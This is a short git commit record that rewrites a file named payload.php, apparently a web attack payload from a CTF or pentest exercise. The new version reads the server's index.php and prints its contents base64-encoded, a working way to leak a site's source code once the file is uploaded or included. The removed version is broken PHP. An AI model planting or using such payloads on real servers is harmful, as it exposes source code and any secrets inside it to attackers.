c89a5ed5e4e619d1185601a342f9ee675cffba93
Yassine Bourki <76617694+YaS5in3@users.noreply.github.com>
2023-03-09 11:37:01 +0100

    Update payload.php

--- payload.php
+++ payload.php
@@ -1,1 +1,1 @@
-<?php $myfile = fopen("index.php", "r") or die("Unable to open file!"); echo fgets(base64_encode($myfile)); echo aaaa; fclose($myfile); ?>
+<?php $file_contents = file_get_contents('index.php'); echo base64_encode($file_contents); ?>
